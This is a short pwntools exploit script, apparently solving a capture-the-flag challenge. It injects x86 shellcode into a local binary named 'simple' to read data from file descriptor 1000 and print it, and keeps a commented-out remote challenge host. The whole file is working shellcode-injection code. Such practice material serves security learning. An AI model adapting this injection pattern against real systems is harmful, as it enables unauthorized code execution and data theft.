
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
p = process("./simple")
# p = remote("plspwn.me",3001)

shellcode = """
    int3
    call a
    a:
    mov eax, 0x3;
    mov ebx, 1000;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    mov eax, 0x4;
    mov ebx, 0x1;
    mov ecx, esp;
    add ecx, 0x44;
    mov edx, 0x20;
    int 0x80;
    pop esp;
    ret
"""

ass = asm(shellcode) + "\0"*20
script = "b *main + 140"
gdb.attach(p, gdbscript = script)
p.sendline(ass)
p.interactive()




